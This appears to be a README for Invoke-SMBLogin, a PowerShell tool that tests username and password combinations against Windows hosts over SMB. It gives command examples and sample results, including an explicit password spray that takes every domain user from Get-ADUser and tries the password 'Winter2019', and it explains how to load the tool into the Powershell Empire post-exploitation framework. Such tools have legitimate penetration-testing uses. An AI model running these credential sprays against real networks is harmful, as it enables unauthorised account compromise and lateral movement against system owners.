# Invoke-SMBLogin #
Validates username &amp; password combination(s) across a host or group of hosts using the SMB protocol.

The script will attempt to mount the C$ administrative share  on a remote host (s) using a username & password combination (s).
It will interpret the results of the attempt and print a table on the console with the results.

## Examples ##

Depending on the type of parameter ( a single item, comma separated items or a text file ) the script will run through all the iterations.
	
```
PS C:\> Invoke-SMBLogin -ComputerName host01 -UserName bsimpson -Password Passw0rd1
PS C:\> Invoke-SMBLogin -ComputerName host01 -UserName bsimpson -Password "Passw0rd1,Passw0rd2,Passw0rd3"
PS C:\> Invoke-SMBLogin -ComputerName "host01,host02,host03" -UserName bsimpson -Password "Passw0rd1,Passw0rd2,Passw0rd3"
```

```  
PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName hosts.txt -UserName Administrator -Password Passw0rd1
PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName host01 -UserName users.txt -Password Passw0rd1
PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName host01 -UserName users.txt -Password passwords.txt
```
```
PS C:\> Invoke-SMBLogin -ComputerName hosts.txt -UserName Administrator -Password "Passw0rd1,Passw0rd2"

ComputerName Username              Password  Result
------------ --------              --------  ------
192.168.1.1  builtin\Administrator Passw0rd1 Failed
192.168.1.1  builtin\Administrator Passw0rd2 Failed
192.168.1.2  builtin\Administrator Passw0rd1 Failed
192.168.1.2  builtin\Administrator Passw0rd2 Success
```  
This will perform a password spray attack across all domain users using Winter2019 against a host in the domain. It could be a DC or any other member server/workstation as long as it has SMB open.
```
PS C:\> Get-ADUser -Filter * | Select-Object SamAccountName > users.txt
PS C:\> Invoke-SMBLogin -Domain lab.org -ComputerName AnyDomainHost -UserName users.txt -Password Winter2019
```  

## Using Invoke-SMBLogin with Powershell Empire ##

To use Invoke-SMBLogin from a Powershell Empire agent, you have to copy the Powershell script and the Empire module python script to the Empire folder:

- Invoke-SMBLogin.ps1 to **data/module_source/situational_awareness/network/**
- smblogin.py to **lib/modules/powershell/situational_awareness/network/**
